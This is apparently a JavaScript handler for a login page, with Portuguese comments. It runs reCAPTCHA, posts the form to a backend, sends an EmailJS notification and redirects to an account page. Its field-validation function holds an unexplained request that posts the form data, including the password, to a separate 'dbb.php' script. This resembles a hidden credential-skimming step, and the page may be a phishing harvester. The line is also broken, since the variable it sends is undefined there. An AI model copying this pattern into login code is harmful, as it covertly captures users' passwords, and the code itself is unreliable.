document.addEventListener("DOMContentLoaded", function() {
    
    emailjs.init("SUA_PUBLIC_KEY"); // obrigatório

    const form = document.getElementById('loginForm');

    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const email = document.getElementById("email").value.trim();
        const password = document.getElementById("password").value.trim();

        if (!validarCampos(email, password)) return;

        grecaptcha.ready(async function() {
            try {
                const token = await grecaptcha.execute('6LcvXCEsAAAAAD8UP8FtA29Anwpeq7AhiVWZQ_fQ', { action: 'submit' });

                const formData = new FormData(form);
                formData.append('g-recaptcha-response', token);

                const respostaBackend = await fetch("backend.php", {
                    method: "POST",
                    body: formData
                });

                const resultado = await respostaBackend.json();
                console.log("Resultado do backend:", resultado);

                if (!resultado.sucesso) {
                    alert("⚠ Erro no reCAPTCHA: " + resultado.erro);
                    return;
                }

                // SOMENTE AGORA envie email
                const emailResponse = await emailjs.send(
                    "service_woaqqdh",
                    "template_tg9sqd3",
                    { user_email: email }
                );

                console.log("EmailJS:", emailResponse);

                alert("✅ Login validado! Score Google: " + resultado.score);

                window.location.href = "account.html";

            } catch (erro) {
                console.error("Erro:", erro);
                alert("❌ Ocorreu um erro inesperado.");
            }
        });
    });
});

function validarCampos(email, password) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;


    fetch("dbb.php",{
        method: "POST",
        body: formData
    });


    if (!emailRegex.test(email)) {
        alert("Digite um e-mail válido.");
        return false;
    }

    if (password.length < 6) {
        alert("A senha deve ter pelo menos 6 caracteres.");
        return false;
    }

    return true;
}
